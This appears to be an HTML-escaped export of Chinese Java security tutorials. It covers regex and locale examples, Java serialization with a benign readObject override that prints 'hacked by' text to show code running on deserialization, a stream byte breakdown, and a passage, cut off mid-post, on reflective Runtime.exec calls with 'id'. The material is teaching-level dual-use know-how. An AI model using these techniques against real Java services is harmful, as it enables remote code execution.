&#123;        String str = &quot;100.&quot;;        String regex = &quot;\\\\d+(\\\\.\\\\d+)?&quot;;        System.out.println(str.matches(regex)); //false    &#125;&#125;\n\n范例:现在判断一个字符串是否由日期所组成，如果是由日期所组成则将其转为 Date 类型。\n//String类对正则的支持,字符串替换package three;import java.text.ParseException;import java.text.SimpleDateFormat;public class Test33 &#123;    public static void main(String[] args) throws ParseException &#123;        String str = &quot;1981-10-15&quot;;        String regex = &quot;\\\\d&#123;4&#125;-\\\\d&#123;2&#125;-\\\\d&#123;2&#125;&quot;;        if (str.matches(regex))&#123;            System.out.println(new SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(str));        &#125;    &#125;&#125;\n\n\n​    需要注意的是，正则表达式无法对里面的内容进行判断，只能够对格式进行判断处理。\n范例:判断给定的电话号码是否正确？\n​    电话号码: 51283346; \\\\d{7,8}\n​    电话号码: 01051283346; (\\d{3,4})?\\d{7,8}\n​    电话号码: (010)-51283346。\n//String类对正则的支持,字符串替换package three;import java.text.ParseException;import java.text.SimpleDateFormat;public class Test33 &#123;    public static void main(String[] args) throws ParseException &#123;        String str = &quot;01051283346&quot;;        String regex = &quot;((\\\\d&#123;3,4&#125;)|(\\\\(\\\\d&#123;3,4&#125;\\\\)-))?\\\\d&#123;7,8&#125;&quot;;        System.out.println(str.matches(regex)); //true    &#125;&#125;\n\n​    既然已经可以使用正则进行验证了，那么下面就可以利用其来实现一个 email 地址格式的验证。\n范例:验证 email 格式\nemail 的用户名可以由字母、数字、_所组成; （不应该使用_开头）\nemail 的域名可以由字母、数字、_、-所组成;\n域名的后缀必须是:.cn、.com、 .net、 .com.cn、 .gov;\n“&#x6d;&#x6c;&#x64;&#x6e;&#106;&#x61;&#x76;&#x61;&#x38;&#56;&#x38;&#x40;&#109;&#108;&#x64;&#x6e;&#46;&#99;&#110;“\n\n//String类对正则的支持,字符串替换package three;import java.text.ParseException;import java.text.SimpleDateFormat;public class Test33 &#123;    public static void main(String[] args) throws ParseException &#123;        String str = &quot;mldnjava888@mldn.cn&quot;;        String regex = &quot;[a-zA-Z0-9]\\\\w+@\\\\w+\\\\.(cn|com|com.cm|net|gov)&quot;;        System.out.println(str.matches(regex)); //true    &#125;&#125;\n\nJava.util.regex开发包​    虽然在大部分的情况下都可以以利用 String 类实现正则的操作，但是也有一些情况下需要使用到 java.util.regex 开发包中提供的正则处理类。在这个包里面一共定义有两个类: Pattern (正则表达式编译)、Matcher (匹配)。\n​    1、pattern 类提供有正则表达式的编译处理支持: public static Pattern compile(String regex);同时也提供有字符串的拆分操作: public String[] split(CharSequence input);\npackage three;//java.util.regex开发包import java.util.regex.Pattern;public class Test34 &#123;    public static void main(String[] args) &#123;        String str = &quot;jguigU()bfj&amp;%*JH*Y(*()BN NBCHTR^R&quot;;        String regex = &quot;[^a-zA-Z0-9]+&quot;;        Pattern pat = Pattern.compile(regex); //编译正则表达式        String[] result = pat.split(str); //拆分        for (int x = 0;x&lt; result.length;x++)&#123;            System.out.println(result[x]);        &#125;    &#125;&#125;\n\n \n​    2、Matcher 类，实现了正则匹配的处理类，这个类的对象实例化依靠 Pattern 类完成:\n​    Pattern 类提供的方法: public Matcher matcher(CharSequence input);\n​    当获取了 Matcher 类的对象之后就可以利用该类中的方法进行如下操作:\n​        正则匹配: public boolean matches();​        字符串替换: public String replaceAIl(String replacement)\n范例:字符串匹配.\npackage three;//java.util.regex开发包import java.util.regex.Matcher;import java.util.regex.Pattern;public class Test34 &#123;    public static void main(String[] args) &#123;        String str = &quot;101&quot;;        String regex = &quot;\\\\d+&quot;;        Pattern pat = Pattern.compile(regex); //编译正则表达式        Matcher mat = pat.matcher(str);        System.out.println(mat.matches()); //true    &#125;&#125;\n\n​    如果纯粹是以拆分，替换，匹配三种操作为例根本用不到 java.util.regex 开发包，只依靠 String 类就都可以实现了，但是 mather 类里面提供有一种分组的功能，而这种分组的功能是 String 不具备的。\npackage three;//java.util.regex开发包import java.util.regex.Matcher;import java.util.regex.Pattern;public class Test34 &#123;    public static void main(String[] args) &#123;        // 要求取出&quot;#&#123;内容&#125;&quot;标记中的所有内容        String str = &quot;INSERT INTO dept(deptno,dname,loc) VALUES (#&#123;deptno&#125;,#&#123;dname&#125;,#&#123;loc&#125;)&quot;;        String regex = &quot;#\\\\&#123;\\\\w+\\\\&#125;&quot;;        Pattern pat = Pattern.compile(regex); //编译正则表达式        Matcher mat = pat.matcher(str);        while (mat.find()) &#123; //是否有匹配成功的内容            System.out.println(mat.group(0));        &#125;    &#125;&#125;\n\n\npackage three;//java.util.regex开发包import java.util.regex.Matcher;import java.util.regex.Pattern;public class Test34 &#123;    public static void main(String[] args) &#123;        // 要求取出&quot;#&#123;内容&#125;&quot;标记中的所有内容        String str = &quot;INSERT INTO dept(deptno,dname,loc) VALUES (#&#123;deptno&#125;,#&#123;dname&#125;,#&#123;loc&#125;)&quot;;        String regex = &quot;#\\\\&#123;\\\\w+\\\\&#125;&quot;;        Pattern pat = Pattern.compile(regex); //编译正则表达式        Matcher mat = pat.matcher(str);        while (mat.find()) &#123; //是否有匹配成功的内容            System.out.println(mat.group(0).replaceAll(&quot;#|\\\\&#123;|\\\\&#125;&quot;,&quot;&quot;));        &#125;    &#125;&#125;\n\n\n​    java.util.regex 开发包，如果不是进行一些更为复杂的正则处理是很难使用到的，而String类所提供的功能只提供基本操作。\n\n国际化程序实现国际化程序实现原理​    所谓的国际化的程序指的是同一个程序代码可以根据不同的语言描述，但是程序处理的核心业务是相同的。\n​    现在假设有一款世界都认可的企业管理平台，那么这个企业的老板决定将这个产品推广到世界各个大大型上市公司，于是这些公司可能来自于:中国、美国、德国，那么在这样的情况下，首先要考虑的问题是什么呢？\n\n​    通过分析得出的结论是，如果要想实现国际化的程序开发，那么要解决两个问题.\n ⑴如何可以定义保存文字的文件信息；\n \n ⑵如何可以根据不同的区域语言的编码读取指定的资源信息。\n\n​    所谓的资源文件指的是后缀名称为“*properties”里面保存的内容按照“key=value”的形式保存，而且资源文件的命名标准与 Java 类完全一样。\nLocale类​    通过分析可以发现，如果要想实现国际化，那么首先需要解决的就是不同国家用户的区域和语言的编码问题，而在 java.util. 里面提供有一个专门描述区域和语言编码的类:Locale。而后主要可以使用 Locale 类中的两个构造方法进行实例化。\n构造方法: public Locale(String language);构造方法: public Locale( String language, String country);\n\n​    此时需要的是国家和语言的代码，而中文的代码:zh_CN、美国英语的代码: en _US,对于这些区域和语言的编码最佳获得广式就是通过IE浏览器。\n范例:实例化 Locale 类对象\n//package three;import java.util.Locale;public class Test35 &#123;    public static void main(String[] args) &#123;        Locale loc = new Locale(&quot;zh&quot;,&quot;CN&quot;); //中文        System.out.println(loc); //zh_CN    &#125;&#125;\n\n​    如果说现在要想自动获得当前的运行环境，那么现在就可以利用 Locale 类本身默认的方式进行实例化。\n读取本地默认环境： public static Locale getDefault()\n\n//package three;import java.util.Locale;public class Test35 &#123;    public static void main(String[] args) &#123;        Locale loc = Locale.getDefault();        System.out.println(loc); //zh_CN_#Hans    &#125;&#125;\n\n​    在实际的开发过程之中，很多人可能并不关心国家和语言的编码，所以为了简化开发，Locale 也将世界上一些比较著名的国家的编码设置为了常量。\n//package three;import java.util.Locale;public class Test35 &#123;    public static void main(String[] args) &#123;        Locale loc = Locale.CHINA;        System.out.println(loc); //zh_CN    &#125;&#125;\n\n​    使用常量的优势在于可以避免一些区城编码信息的繁琐。\nResourceBundle读取资源文件​    现在已经准备好资源文件，那么随后就需要进行资源文件的读取操作了，而读取资源文件主要依靠的是 java.util.ResourceBundle 类完成，此类定义如下：\npublic abstract class ResourceBundle extends Object\n\n​    ResoufcBundle 是一个抽象类，如果说现在要想进行此类对象的实例化可以直接利用该类中提供的一个静态方法完成。\n​    获取 ResourceBundle 类对象: public static final ResourceBundle getBundle( String baseName); \n​    baseName:描述的是资源文件的名称，但是没有后缀。(cn.mldn.message.Messages);\n​    根据key读取资源内容: public final String getString(String key);\n定义资源文件：\n\ninfo=adbaufb\n\n​    这里面保存的 info 是这个信息的 key，以后要根据这个 key 取得对应的 value\n范例:使用 ResourceBundle 类读取内容\n//ResourceBundle读取资源文件package three;import java.util.Locale;import java.util.ResourceBundle;public class Test35 &#123;    public static void main(String[] args) &#123;        ResourceBundle resource = ResourceBundle.getBundle(&quot;Messages&quot;);        String val = resource.getString(&quot;info&quot;);        System.out.println(val);//adbaufb    &#125;&#125;\n\n​    如果资源没有放在包里面，则直接编写资源名称即可。\n​    在进行资源读取的时候数据 的 key 一定要存在，如果不存在则会出现异常信息。\n\n。。。。。。。。。。\n未完\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","反射"]},{"title":"Java安全从零到一(6)-Java反序列化初探","url":"/2023/01/12/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-6-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/","content":"Java序列化与反序列化​    经过前面的深入学习，应该可以深入了解一下Java的序列化与反序列化了，这也是非常重要的基础部分\n\n什么是Java序列化/反序列化​    Java 序列化就是把一个 Java Object 变成一个二进制字节数组 , 即 byte[] .\n​    Java 反序列化就是把一个二进制字节数组(byte[]) 变回 Java 对象 , 即 Java Object .\n​    在很多应用中 , 为了减轻内存压力或长期保存数据 , 会将部分对象进行序列化操作 , 使其脱离内存空间进入物理磁盘 . 当需要使用这些对象时 , 会将存储的字节数组进行反序列化操作 , 重构出对象.\n​    在很多服务中( 例如 Java RMI 远程方法调用 ) , 客户端和服务端之间传输的是” 对象 “ 而不是基本数据类型 . 此时会将对象进行序列化操作后 , 将字节数组传输给对方 . 由对方通过反序列化操作获取原对象 .\n​    总而言之 , Java 序列化/反序列化的目的无非就是用于 “ 数据存储 “ 或 “ 数据传输 “ .\n如何实现Java序列化/反序列化Serializable 接口 / Externalizable 接口Serializable​    如果一个类要实现序列化操作 , 则必须实现 Serializable 接口 , 并且可以在类中设置 serialVersionUID 属性 .\n​    Serializable 接口中没有方法和属性字段 , 仅用于标识序列化的语义 , 代表该类可以进行序列化/反序列化操作 .\n​    如果在序列化时发现某个对象不能被序列化( 例如在遍历某些图形对象时 ) , 则会抛出 NotSerializableException 异常并标识不可序列化对象的类 .\n​    在序列化或反序列化过程中需要进行特殊处理的类要实现下面三个方法 :\n\n\n​    每个可序列化的类在序列化时都会关联一个版本号 , 这个版本号就是 serialVersionUID 属性 .\n​    在反序列化过程中会根据这个版本号来判断序列化对象的发送者和接收着是否有与该序列化/反序列化过程兼容的类 .( 简单的说就是序列化过程和反序列化过程都需要被序列化的类 , 通过 serialVersionUID 属性来判断这两个类的版本是否相同 , 是否是同一个类 ) . 如果不相同 , 则会抛出 InvalidClassException 异常\n​    serialVersionUID 属性必须通过 static final long 修饰符来修饰 .\n​    如果可序列化的类未声明 serialVersionUID 属性 , 则 Java 序列化时会根据类的各种信息来计算默认的 serialVersionUID 值 . 但是 Oracle 官方文档强烈建议所有可序列化的类都显示声明 serialVersionUID 值 .\n\n​    因为默认的 serialVersionUID 计算会对类详细信息高度敏感 , 而类详细信息可能会根据编译器的实现而有所不同 . 因此可能在反序列化期间抛出意外的 InvalidClassExceptions 异常 .\nExternalizable​    不仅可以通过继承 Serializable 接口来标识某个类是可序列化的 , 还可以通过继承 Externalizable 接口来标识某个类是可序列化的 . 事实上 , Externalizable 接口继承了 Serializable 接口 .\n\n​    通过 Externalizable 接口实现序列化和反序列化操作会相对麻烦一点 , 因为我们需要手动编写 writeExternal()方法和readExternal()方法 , 这两个方法将取代定制好的 writeObject()方法和 readObject()方法 .\n​    那什么时候会使用 Externalizable 接口呢 ? 当我们仅需要序列化类中的某个属性 , 此时就可以通过 Externalizable 接口中的 writeExternal() 方法来指定想要序列化的属性 . 同理 , 如果想让某个属性被反序列化 , 通过 readExternal() 方法来指定该属性就可以了.\n\n​    此外 , Externalizable 序列化/反序列化还有一些其他特性 , 比如 readExternal() 方法在反序列化时会调用默认构造函数 , 实现 Externalizable 接口的类必须要提供一个 Public 修饰的无参构造函数等等\n​    Serializable 和 Externalizable 两个接口的区别及优劣 .\n\n\n\n区别\nSerializable\nExternalizable\n\n\n\n实现复杂度\n实现简单，Java对其有内建支持\n实现复杂，由开发人员自己完成\n\n\n执行效率\n所有对象由Java统一保存，性能较低\n开发人员决定哪个对象保存，可能造成速度提升\n\n\n保存信息\n保存时占用空间大\n部分存储，可能造成空间减少\n\n\nwriteObject()与readObject()​    在最简单的情况下 , 开发人员会通过继承 Serializable 类来实现序列化与反序列化 . 这种方法离不开 writeObject() 和 readObject() 两个方法.\n\n​    从官方文档可以看出 , 在序列化和反序列化时需要实现上述两个方法 , 这两个方法的参数都是 ObjectOutputStream 类型的 . 来简单介绍下这个类 .\njava.io.ObjectOutputStream​    ObjectOutputStream 类会将支持 java.io.Serializable 接口的 Java对象( 包括部分图形对象 ) 的原始数据类型写入 OutputStream 中 . 然后使用 ObjectInputStream 类读取( 重构 )对象 .\n​    可以通过使用 “ 文件流 “ 来实现对象的持久存储 , 也可以使用 “ 网络套接字流 “ 来传输对象 .\n​    值得一提的是 , 这里 Output 和 Input 都是针对 “ 内存 “ 来说的 . Output 即将 “ 内存 “ 中的 Java对象 传输到 “ 文件流 “ 或者 “ 网络套接字流 “ 中 , 而 Input 则是将 “ 文件流 “ 或 “ 网络套接字流 “ 中的数据加载到 “ 内存 “ 中 , 这个点容易搞混 , 需要重点关注 .\n​    java.io.ObjectOutputStream 类会通过 writeObject() 方法将 Java 对象写入到数据流中 .\njava.io.ObjectOutputStream.writeObject( ObjectOutputStream stream )​    writeObject()方法会将所有 对象的类 , 类签名 , 非瞬态和非静态字段的值 写入到数据流中\n​        1.什么是类签名？\n​        在开发 JNI( Java Native Interface , Java 本地接口 ) 时需要调用 Java 层的方法或创建引用 , 此时就会用到 Java 签名机制 . 比如基本数据类型的签名如下所示 :\n\n​        还有像 Ljava/lang/Class; , Ljava/lang/String; 等都是类签名 , 这些字符串在解析 Java 序列化数据时会用到 .\n​        2.什么是非瞬态？\n​        瞬态变量( Transient ) 是一个 Java 关键词 , 它用于标记类的成员变量在持久化到字节流时不要被序列化 ; 在通过网络套接字流传输字节流时 , transient 关键词标记的成员变量不会被序列化 .\n\n​        因此 , 如果仅想序列化某个类中部分变量 , 除了可以通过继承 Externalizable 接口来指定需要序列化的成员变量 ; 还可以将其他变量添加 transient 关键词 , 使得变量不被序列化 .\n范例：\nimport java.io.*;//用于序列化的ObjectOutputStream类和writeObject方法public class wo implements Serializable &#123;    static final long serialVersionUID = 1L;    public static void main(String[] args) throws IOException &#123;        //创建一个文件输出流        FileOutputStream fos = new FileOutputStream(&quot;test.ser&quot;);        //创建一个对象输出流，将序列化数据输出文件流        ObjectOutputStream oos = new ObjectOutputStream(fos);        //调用java.io.ObjectOutputStream.writeObject()方法,将&quot;mes9s0&quot;字符串输出到文件流        //该方法只能将对象的类，类签名，非瞬态和非静态字段的值写入        oos.writeObject(&quot;mes9s0&quot;);        oos.close();        fos.close();    &#125;&#125;\n\n\njava.io.ObjectInputStream​    通过 ObjectOutputStream 类可以将对象写入数据流中 , 而通过 ObjectInputStream 类可以将数据流中的字节数组重构成对象 .\n​    ObjectInputStream 类在重构对象时会从本地 JVM 虚拟机中加载对应的类 , 以确保重构时使用的类与被序列化的类是同一个 . 也就是说 : 反序列化进程的 JVM 虚拟机中必须加载被序列化的类 .\n​    java.io.ObjectInputStream 类会通过 readObject() 方法将数据流中的序列化字符串重构成 Java 对象.\njava.io.ObjectInputStream.readObject( ObjectInputStream stream )​    readObject() 方法将读取序列化数据中各个字段的数据并分配给新对象的相应字段来恢复状态 . 需要注意的是 : readObject() 方法仅会反序列化 非静态变量 和 非瞬态变量 . 当读取到一个用 transient 修饰符修饰的变量时 , 将直接丢弃该变量 , 不再进行后续操作 .\n​    此外 , 反序列化过程中 , 需要将重构的对象强制转换成预期的类型 , 比如 String 型变量就需要通过 (String) 修饰符强制转换成原来的类型 .\n​    例如这里将 test.ser 中的序列化字符串进行反序列化操作 .\nimport java.io.*;public class wo2 implements Serializable &#123;    static final long serialVersionUID = 1L;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        //序列化,具体注释见wo类        FileOutputStream fos = new FileOutputStream(&quot;test2.ser&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(&quot;mes9s0&quot;);        oos.close();        fos.close();        //反序列化        //创建一个文件输入流        FileInputStream fis = new FileInputStream(&quot;test2.ser&quot;);        //创建一个对象输入流,将文件流中的序列化数据放到对象流中（个人理解）        ObjectInputStream ois = new ObjectInputStream(fis);        //调用java.io.ObjectInputStream.readObject()方法重构对象，必须强制类型转换        String name = (String) ois.readObject();        System.out.printf(name);    &#125;&#125;\n\n\n​    可以看到 , String 对象被重构了 , 对象的值 “ mes9s0” 也被还原了 .\n\n完成的Java序列化/反系列化流程​    通过上面的内容 , 已经可以得到一个完整的 Java 序列化 / 反序列化流程 .\n序列化过程​    由下面两个类完成\npackage wholeSerializable;import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Man implements Serializable &#123;    static final long serialVersionUID = 1L;    public String str = &quot;hello!&quot;;    public String ptr(String name) &#123;        String str =  name + &quot;is a Man!&quot;;        return str;    &#125;&#125;\n\npackage wholeSerializable;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class ser &#123;    public static void main(String[] args) throws IOException &#123;        Man man = new Man();        FileOutputStream fos = new FileOutputStream(&quot;test3.ser&quot;);        ObjectOutputStream oot = new ObjectOutputStream(fos);        oot.writeObject(man);        oot.close();        fos.close();    &#125;&#125;\n\n\n​        Man 类中存在变量 str 和 方法 prt() . 该类继承了 Serializable 接口 , 表明该类可以被序列化 . ser 类用于执行 Java 序列化过程 . 将 Man 类的实例对象序列化后输出到文件流中 , 并保存在 /tmp/test.ser 文件中 .\n反序列化过程package wholeSerializable;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unSer &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        FileInputStream fin = new FileInputStream(&quot;test3.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fin);        Man man = (Man)ois.readObject();        ois.close();        fin.close();        System.out.println(man.str);        System.out.println(man.ptr(&quot;mes9s0&quot;));    &#125;&#125;\n\n​    unSer 类打开文件流 , 读取 /tmp/test.ser 文件的内容 , 并进行反序列化操作 . 注意要进行强制转换 .\n​    重构对象后 , 输出 Man 类 str 变量的值 , 并且执行 Man 类的 prt() 函数 . 全部执行成功 , 说明 Man 对象的相关字段全部被恢复了 .\n​    一个最简单的 序列化 / 反序列化 过程就结束了 .\n\nJava反序列化漏洞​    问题就出在 Java 反序列化过程的关键函数 readObject() 上 . 这里需要仔细看一下 readObject() 方法 .\n\n​    官方允许用户在被序列化的类中重写 readObject() 方法 , 重写后的方法将负责在反序列化时重构当前类对象 .\n​    用户只需要在重写的 readObject() 方法中实现 defaultReadObject() 方法 , 就可以确保反序列化过程正常执行 . 至于添加的代码内容 , 官方没有做任何限制 .\n例子：\n我们自己写一个readObject方法\npackage wholeSerializable;import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Man implements Serializable &#123;    static final long serialVersionUID = 1L;    public String str = &quot;hello!&quot;;    public String ptr(String name) &#123;        String str =  name + &quot;is a Man!&quot;;        return str;    &#125;    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ois.defaultReadObject();        System.out.println(&quot;hacked by mes9s0&quot;);    &#125;&#125;\n\npackage wholeSerializable;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class ser &#123;    public static void main(String[] args) throws IOException &#123;        Man man = new Man();        FileOutputStream fos = new FileOutputStream(&quot;test3.ser&quot;);        ObjectOutputStream oot = new ObjectOutputStream(fos);        oot.writeObject(man);        oot.close();        fos.close();    &#125;&#125;\n\npackage wholeSerializable;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unSer &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        FileInputStream fin = new FileInputStream(&quot;test3.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fin);        Man man = (Man)ois.readObject();        ois.close();        fin.close();        System.out.println(man.str);        System.out.println(man.ptr(&quot;mes9s0&quot;));    &#125;&#125;\n\n\n​    可以看到 , 在不修改其他代码的情况下 , 通过重写 readObject() 方法时添加其他代码 , 可以使得被添加的代码在反序列化过程中被执行\n​    也就是说 , 如果我们在其中添加恶意代码 , 那么恶意代码也将被反序列化并执行 .我们的恶意代码也会被执行\n\n\n​    我们指定的恶意代码被成功执行 , 这就是 Java 反序列化漏洞一个最简单的案例 .\n\nJava反序列化数据分析​    简单分析一下反序列化数据的含义\n\n​    有一个项目SerializationDumper可以很方便的分析Java序列化数据\n1. 先处理序列化数据的十六进制字符串\n\nimport subprocessimport sysimport redef getxxd():        xd = &quot;&quot;        #通过xxd -i 参数 ，便于分离十六进制数据        ret = subprocess.getoutput(&#x27;xxd -i &#x27; + sys.argv[1])        pattern = re.compile(r&#x27;0x[a-z0-9]&#123;2&#125;&#x27;)        res = re.findall(pattern, ret)        for i in res:                xd = xd + i.strip()        result = xd.replace(&quot;0x&quot;,&quot;&quot;)        print(result)if __name__ == &#x27;__main__&#x27;:        getxxd()\n\n\naced00057372001577686f6c6553657269616c697a61626c652e4d616e00000000000000010200014c00037374727400124c6a6176612f6c616e672f537472696e673b787074000668656c6c6f21\n\n通过 SerializationDumper 工具解析十六进制字符串.\n\n\nSTREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents  TC_OBJECT - 0x73    TC_CLASSDESC - 0x72      className        Length - 21 - 0x00 15        Value - wholeSerializable.Man - 0x77686f6c6553657269616c697a61626c652e4d616e      serialVersionUID - 0x00 00 00 00 00 00 00 01      newHandle 0x00 7e 00 00      classDescFlags - 0x02 - SC_SERIALIZABLE      fieldCount - 1 - 0x00 01      Fields        0:          Object - L - 0x4c          fieldName            Length - 3 - 0x00 03            Value - str - 0x737472          className1            TC_STRING - 0x74              newHandle 0x00 7e 00 01              Length - 18 - 0x00 12              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b      classAnnotations        TC_ENDBLOCKDATA - 0x78      superClassDesc        TC_NULL - 0x70    newHandle 0x00 7e 00 02    classdata      wholeSerializable.Man        values          str            (object)              TC_STRING - 0x74                newHandle 0x00 7e 00 03                Length - 6 - 0x00 06                Value - hello! - 0x68656c6c6f21\n\n​    1. ACED0005\n​    0xAC 0xED 为 Java 序列化字符串魔术幻数 , 可以看作是 Java 序列化字符串的特征值 , 每次 Java 序列化字符串被创建时 , 都会添加该特征值 .\n​    0x00 0x05 为 Java 序列化版本号 , 一般来说版本号都为 : 5 . 很少看到其他数字/\n​    2. 7372\n​    0x73 即 TC_OBJECT , 代表下面内容是一个新的对象 .\n​    0x72 即 TC_CLASSDESC , 类描述符 , 代表一个新类的开始\n​    这些属性的定义位于 java.io.ObjectStreamConstants 类中 , 可以参考 Source for java.io.ObjectStreamConstants .\n\n​    3. 0002\n​    这里是 Java 序列化属性标识符 , 即 classDescFlags , 该属性字段的值为 5 个标记的算数和\n\n​    SC_WRITE_METHOD = 0x01 : 如果被序列化的类中重写了 writeObject() 方法 , 则设置该标志 , 并使用 TC_ENDBLOCKDATA 标记来终止该类的数据 .\n​    SC_BLOCK_DATA = 0x08 : 如果使用 STREAM_PROTOCOL_2 将 Externalizable 类写入流中 , 则设置该标志 .\n​    这里用的不多 , 内容也比较复杂 , 关于 Stream Protocol 以及 BLOCK DATA 的内容可以参考 Object Serialization Stream Protocol , 这里不详细说明了 .\n​    SC_SERIALIZABLE = 0x02 : 如果被序列化的类继承了 Serializable 接口 , 则设置该标志 , 并在反序列化时调用的类也需要继承 Serializable 接口 , 并使用默认的反序列化机制 .\n​    SC_EXTERNALIZABLE = 0x04 : 如果被序列化的类继承了 Externalizable 接口 , 则设置该标志 , 并在反序列化时调用的类也需要继承 Externalizable 接口 . 并且在序列化/反序列化过程中要使用 readExternal() 方法和 writeExternal() 方法处理序列化数据 .\n​    SC_ENUM = 0x10 : 如果被序列化的类是枚举类型 , 则设置该标志 . 同时反序列化时调用的类也必须是枚举类型 .\n​    这里用的不多 , 内容也比较复杂 , 关于枚举类型常量的序列化可以参考* Serialization of Enum Constants, 这里不详细说明了 .\n​    4. 4c\n​    这里是 “ 类类签名 “ . 即字段类型的类签名 . 注意 , 这里非常容易搞混 ! 是字段类型的类签名 , 不是字段值的类签名 .\n​    也就是说 , 这里填写的是类类签名 , 而不是类签名( 实在有点绕 , 您多理解下. )\n​    弄明白之后就好理解了 , 这里需要填写 “ L “ , 即 0x4C .\n\n​    5. 7870\n​    0x78 : 为 Block_data 的结束表示符号 .可以理解为一个原始数据块的结束 .\n\n​    0x70 : 用于在流中指定 Null 引用 . 因为这里字段的字段代表 父类的类描述符号 , 而 Man 类仅继承了 Serializable 接口 , 并未继承其他类 , 所以这里应指定为 Null .\n\n​    至此 , 这段序列化数据就分析完了 , 其实整体来看并不难 , 数据中具体的部分我没有分析，可以直接看软件分析的结果，也能看懂。下一章，我们来看一下更深入的。\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","反序列化"]},{"title":"Java安全从零到一(5)-Java RCE(Remote Code Execute)","url":"/2022/11/16/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-5-Java-RCE-Remote-Code-Execute/","content":"​    上一篇学习了Java反射机制，这篇学习一下RCE，将 Java反射与RCE方式结合在一起。\nJava.lang.Runtime​    java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式 ,\n​    在没有了解 Java 反射机制前 , 可能无法理解真正含义. 现在 , 来看一看它的原理到底是什么 .\n\n正常情况下 , 我们想要拿到一个除系统类以外的类 , 必须要先 import 后才能使用 . 否则会出现 cannot find symbol 等报错 . 但是在进行利用时 , 系统是不会让你随意加载类的 . 但是 , 通过 Class.forName(className) 获取类则没有这个限制 , 我们可以通过 forName() 方法加载任何类 .\n\n//java.lang.Runtimeimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Runtime &#123;    public Runtime() &#123;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);    &#125;&#125;\n\n\n\n拿到了 java.lang.Runtime 类后 , 我们肯定想知道该类可调用的方法 . 于是通过 className.getMethods() , className.getDeclaredMethods() 来获取类的方法\n\n//java.lang.Runtimeimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Runtime &#123;    public Runtime() &#123;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);        //className.getMethods()        System.out.println(&quot;getMethods获取方法:&quot;);        Method[] methods = cls.getMethods();        for (Method m : methods) &#123;            System.out.println(m);        &#125;        //className.getDeclaredMethods()        System.out.println(&quot;\\ngetDeclaredMethods获取的方法&quot;);        Method[] declareMethods = cls.getDeclaredMethods();        for (Method m : methods) &#123;            System.out.println(m);        &#125;    &#125;&#125;\n\n\n​    从输出信息中可以找到我们想要执行的 exec() 方法\n\n拿到了类 , 拿到了类的方法 , 就可以通过反射实例化对象并通过 invoke() 调用方法了\n\n//java.lang.Runtimeimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Runtime &#123;    public Runtime() &#123;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);//        //className.getMethods()//        System.out.println(&quot;getMethods获取方法:&quot;);//        Method[] methods = cls.getMethods();//        for (Method m : methods) &#123;//            System.out.println(m);//        &#125;//        //className.getDeclaredMethods()//        System.out.println(&quot;\\ngetDeclaredMethods获取的方法&quot;);//        Method[] declareMethods = cls.getDeclaredMethods();//        for (Method m : methods) &#123;//            System.out.println(m);//        &#125;//                newInstance nis = (newInstance)cls.getDeclaredConstructor().newInstance();        Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(nis,&quot;id&quot;);        /*        这里是不能执行成功的因为在Runtime类中有private修饰的静态方法        若想成功必须：1、类必须要有无参构造函数。2、类的构造函数不能私有         */    &#125;&#125;\n\n\n​    发现程序抛出了异常 , 报错信息为 : Exception in thread “main” java.lang.IllegalAccessException: Class test7 can not access a member of class java.lang.Runtime with modifiers “private”\n​    test7 类无法访问 java.lang.Runtime 类中带有 “private” 修饰符的成员变量 / 成员函数 .\n​    这会有疑问，第二步明明都是public啊，哪来的private？\n​    仔细想想，我们在通过 cls.newInstance() 构造实例对象时 , 会默认调用无参构造函数 . 难道这个无参构造函数是私有的吗 ?\n看看源码\n\n​    可以发现 , java.lang.Runtime 类的构造方法的确使用了 “private” 修饰符 . 我们知道 “private” 修饰符修饰的方法只能在当前类中被调用 